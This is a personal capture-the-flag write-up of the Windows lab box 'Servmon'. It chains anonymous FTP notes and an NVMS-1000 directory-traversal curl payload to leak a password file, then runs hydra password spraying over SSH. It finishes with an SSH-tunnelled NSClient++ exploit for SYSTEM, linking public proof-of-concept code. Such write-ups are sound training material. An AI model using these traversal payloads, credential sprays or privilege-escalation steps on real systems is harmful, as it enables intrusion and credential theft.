# Servmon — Easy — Windows

**Date:** 18 June 2026

---

## Tags
`#windows` `#ftp-anonymous` `#nvms-1000` `#directory-traversal` `#lfi` `#hydra` `#nsclient` `#port-forwarding` `#privesc`

---

## What I Know

| Item       | Detail                                                          |
| ---------- | -------------------------------------------------------------- |
| Target     | 10.129.18.171                                                  |
| OS         | Windows                                                        |
| Open ports | 21, 22, 80, 135, 139, 445, 5666, 6063, 8443, 49664–49670       |
| Services   | FTP (anon), SSH (Windows), NVMS-1000 (80), NSClient++ (8443)   |
| Users      | Nadine, Nathan (named in FTP notes)                            |
| Foothold   | FTP note → NVMS-1000 directory traversal → passwords.txt → SSH as Nadine |
| Privesc    | NSClient++ 0.5.2.35 admin creds + RCE (port-forwarded) → SYSTEM |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.18.171

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-18 23:19 +0100
Nmap scan report for 10.129.18.171
Host is up (0.062s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 27.77 seconds
```

<img width="870" height="679" alt="image" src="https://github.com/user-attachments/assets/2d7a3dd7-f4cf-4d2e-906a-84404155a019" />

```
nmap -sC -sV -p21,22,80,135,139,445,5666,6063,8443,49664-49670 10.129.18.171

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-18 23:21 +0100
Nmap scan report for 10.129.18.171
Host is up (0.015s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http          (NVMS-1000 — redirects to Pages/login.htm)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
8443/tcp  open  ssl/https-alt
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

(Full port-80 and port-8443 service fingerprints omitted for brevity. they confirm
the NVMS-1000 redirect and the NSClient++ web UI respectively.)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.69 seconds
```

<img width="1641" height="765" alt="image" src="https://github.com/user-attachments/assets/6a8e8820-c7a8-41d0-a1d3-7f68061c8b29" />

**What each port tells me:**
- **Port 21 (FTP)** — Microsoft ftpd with anonymous login allowed. First stop: anonymous access could expose files or hints directly.
- **Port 22 (SSH)** — OpenSSH **for Windows** 8.0. My likely route in once I recover a credential. **note this is the Windows build, not a Linux SSH.
- **Port 80 (HTTP)** — a web app that redirects to `Pages/login.htm`; later identified as **NVMS-1000**, a video-surveillance management UI. Primary web attack surface.
- **Port 135 (MSRPC)** — Windows RPC endpoint mapper. Confirms a standard Windows host; not a direct target.
- **Ports 139, 445 (SMB)** — NetBIOS / SMB. Secondary surface to check after FTP and HTTP.
- **Ports 5666 (NRPE), 6063 (tcpwrapped)** — NRPE is the Nagios remote-plugin agent; both come back tcpwrapped, so no clean banner. Related to the monitoring stack on this box but not directly actionable.
- **Port 8443 (HTTPS)** — **NSClient++** web UI (a Nagios monitoring agent). This is the privesc target, NSClient++ has a known local-admin-to-SYSTEM path.
- **Ports 49664–49670 (MSRPC)** — dynamic high RPC ports, normal Windows behaviour. Not targets themselves.

---

## Enumeration Log

```
OBSERVATION: Port 21 is open with anonymous login allowed
WHAT IT TELLS ME: I can access the FTP share as anonymous, no password needed
WHAT I AM GOING TO TRY: Log in anonymously and explore the share
WHY: The FTP server is misconfigured to allow anonymous login
RESULT:
- The share holds folders for two users, Nadine and Nathan, each with one file containing sensitive notes
- Nathan's note says a Passwords.txt was created and left on his desktop (to be deleted)
- Nadine's note references the NVMS / NSClient setup
WHAT NEXT:
- Read the retrieved notes and use them to plan the next step (the Passwords.txt location is the key lead)
```

<img width="888" height="220" alt="image" src="https://github.com/user-attachments/assets/5cec9333-6dcc-4b4e-a701-f82290cf6c6d" />

<img width="679" height="132" alt="image" src="https://github.com/user-attachments/assets/e04c5c2d-ef7f-4bd2-9721-d3a2158f6d15" />

<img width="701" height="155" alt="image" src="https://github.com/user-attachments/assets/8c7ea64b-5b6d-4041-8fc7-bb69dc75186a" />

<img width="702" height="154" alt="image" src="https://github.com/user-attachments/assets/5ffd0228-6d57-419a-8204-035b4ae5b21b" />

<img width="1830" height="252" alt="image" src="https://github.com/user-attachments/assets/614a37b3-e4b0-4ddb-965f-b41d50732715" />

<img width="588" height="199" alt="image" src="https://github.com/user-attachments/assets/4d3acad6-0891-41f7-b1e2-23caa34f20e8" />

```
OBSERVATION: The web app at http://10.129.18.171/Pages/login.htm is NVMS-1000
WHAT IT TELLS ME:
- NVMS-1000 is a legacy Windows video-surveillance management UI (for DVRs/NVRs)
- It has a known unauthenticated directory-traversal / LFI vulnerability
WHAT I AM GOING TO TRY:
- Use the traversal bug to read the Passwords.txt on Nathan's desktop (location from the FTP note)
- If it yields passwords, spray them over SSH for Nathan and Nadine
WHY: That file likely holds credentials reusable for SSH
RESULT:
- The directory traversal let me read C:\Users\Nathan\Desktop\Passwords.txt , which is a list of passwords
- Brute-forcing SSH with hydra (both users against that list) found the correct password for Nadine
WHAT NEXT: SSH in as Nadine, read user.txt, and look for a privesc path
```

<img width="1199" height="423" alt="image" src="https://github.com/user-attachments/assets/835104da-745c-48a7-9a95-f288c96c47dd" />

<img width="571" height="260" alt="image" src="https://github.com/user-attachments/assets/19549901-111d-46c5-95ec-16af411e5d81" />

<img width="1375" height="639" alt="image" src="https://github.com/user-attachments/assets/a16fd5bf-5e31-4394-a44c-cbf424bac350" />

```
OBSERVATION:
- Logged in as Nadine and read user.txt
- The box runs NSClient++, the same product behind the web UI on port 8443
WHAT IT TELLS ME: NSClient++ is worth investigating, monitoring agents often run as SYSTEM and have known privesc paths
WHAT I AM GOING TO TRY:
- Research NSClient++ for known privilege escalation
- Enumerate the local NSClient++ install for its version and admin password
WHY:
- A third-party service running as SYSTEM with a known exploit is a strong privesc candidate
- I need the exact version and the web admin password to use that exploit
RESULT:
- NSClient++ 0.5.2.35 has a documented local-admin-to-SYSTEM privesc
- Found the version with .\nscp.exe --version and the admin password in C:\Program Files\NSClient++\nsclient.ini
WHAT NEXT: Work out how to abuse NSClient++ to escalate
```

<img width="1066" height="530" alt="image" src="https://github.com/user-attachments/assets/43e2d02b-3bd6-4360-8f7d-01d90ebb81c9" />

<img width="851" height="286" alt="image" src="https://github.com/user-attachments/assets/d5acd15e-c254-4002-af7f-66cb1c9edb8c" />

<img width="1007" height="403" alt="image" src="https://github.com/user-attachments/assets/3bef0c04-6fbf-40cf-ac0e-b25a6d6a0104" />

<img width="756" height="61" alt="image" src="https://github.com/user-attachments/assets/6b268257-771f-4203-ad73-edad00834120" />

<img width="1138" height="413" alt="image" src="https://github.com/user-attachments/assets/8bc43911-7b62-4cd8-8901-1fc20aeb2672" />

```
OBSERVATION:
- Using the admin password against the NSClient++ web UI directly returned 403
- nsclient.ini shows "allowed hosts = 127.0.0.1", the web UI only accepts connections from localhost
- The privesc exploit is documented at https://www.exploit-db.com/exploits/46802
WHAT IT TELLS ME:
- I must reach the UI from the box itself, so I'll SSH-tunnel port 8443 to my machine to appear as 127.0.0.1
- Then I can use the exploit to escalate
WHAT I AM GOING TO TRY:
- Set up SSH local port forwarding (8443) through Nadine so I can reach the UI as localhost
- Run the NSClient++ exploit to get a SYSTEM shell
WHY: To read root.txt
RESULT:
- After port forwarding, the admin password worked and I logged into NSClient++
- The exploit-db PoC was fiddly and didn't work cleanly for me; a more stable version at
  https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation worked, giving SYSTEM and root.txt
```

<img width="1384" height="702" alt="image" src="https://github.com/user-attachments/assets/a86601a6-fa70-48ec-9886-6990f245534c" />

<img width="1027" height="305" alt="image" src="https://github.com/user-attachments/assets/0cbb1a8d-815b-4374-b3fa-9d5e33d7b4d3" />

<img width="1664" height="781" alt="image" src="https://github.com/user-attachments/assets/40199de4-fed8-4190-868a-126fd83cc4fc" />

<img width="1184" height="930" alt="image" src="https://github.com/user-attachments/assets/4c706366-7b70-4d52-8d76-d41700ccdc8f" />

<img width="1745" height="268" alt="image" src="https://github.com/user-attachments/assets/7a0aa07f-5d3e-4f91-b326-e17df4a3622f" />

<img width="868" height="191" alt="image" src="https://github.com/user-attachments/assets/789ddf3e-46e2-4289-a086-62db74505519" />

---

## Foothold

**How I got in:** Anonymous FTP exposed two user notes, Nathan's revealed that a `Passwords.txt` was sitting on his desktop, and Nadine's pointed at the monitoring setup. The web app on port 80 was **NVMS-1000**, which has a known unauthenticated directory-traversal (LFI) bug. I used it to read `C:\Users\Nathan\Desktop\Passwords.txt`, then sprayed that password list over SSH with hydra. one matched **Nadine**, giving an SSH shell and the user flag.

**Command / exploit used:**
```
# anonymous FTP — grab the notes
ftp 10.129.18.171        # login: anonymous

# NVMS-1000 directory traversal to read the password file
curl --path-as-is "http://10.129.18.171/../../../../../../Users/Nathan/Desktop/Passwords.txt"

# spray the recovered list over SSH
hydra -L users.txt -P passwords.txt ssh://10.129.18.171
ssh nadine@10.129.18.171          # password from the list
```

**Why it worked:** A chain of small misconfigurations, anonymous FTP leaked an internal note disclosing exactly where a password file lived, NVMS-1000's traversal bug let me read that arbitrary file with no authentication, and the user had reused one of those passwords for their SSH account.

---

## Privilege Escalation

**Path taken (Nadine → SYSTEM):**

1. **Recovered NSClient++ admin creds locally.** As Nadine I found NSClient++ 0.5.2.35 installed. Its config, `C:\Program Files\NSClient++\nsclient.ini`, stored the web-admin password in cleartext, and `nscp.exe --version` confirmed the vulnerable version.
2. **Bypassed the localhost restriction with SSH tunnelling.** The same `nsclient.ini` set `allowed hosts = 127.0.0.1`, so the web UI on 8443 refused my remote connection (403). I set up SSH **local port forwarding** through Nadine's session, making my local 8443 appear to NSClient++ as a connection from 127.0.0.1 and the admin password then logged me in.
3. **NSClient++ RCE → SYSTEM.** NSClient++ lets an authenticated admin define external scripts and schedule them, and the service runs as SYSTEM so a scheduled script executes as SYSTEM. The exploit-db PoC (46802) was unreliable for me; a more stable reimplementation (xtizi's NSClient-0.5.2.35 privesc) worked, uploading a payload and triggering it to return a SYSTEM shell. Read root.txt.

```
# local port forward so NSClient++ sees us as 127.0.0.1
ssh -L 8443:127.0.0.1:8443 nadine@10.129.18.171
# browse https://127.0.0.1:8443, log in with the nsclient.ini password,
# then run the xtizi PoC to register + schedule a script that runs as SYSTEM
```

**Why it worked:** NSClient++ stored its admin password in cleartext and ran as SYSTEM while letting admins schedule arbitrary scripts, so anyone who can authenticate to its web UI can execute code as SYSTEM. The only barrier was the localhost-only restriction, which SSH port forwarding trivially defeats once you already have a shell on the box.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Read an internal note via anonymous FTP, used an NVMS-1000 directory-traversal bug to leak Nathan's `Passwords.txt`, and sprayed it over SSH to log in as Nadine.
2. **Privesc technique in one sentence:** Pulled the cleartext NSClient++ admin password from `nsclient.ini`, SSH-tunnelled past its localhost-only restriction, and abused its scheduled-script feature (running as SYSTEM) via a public PoC to get a SYSTEM shell.
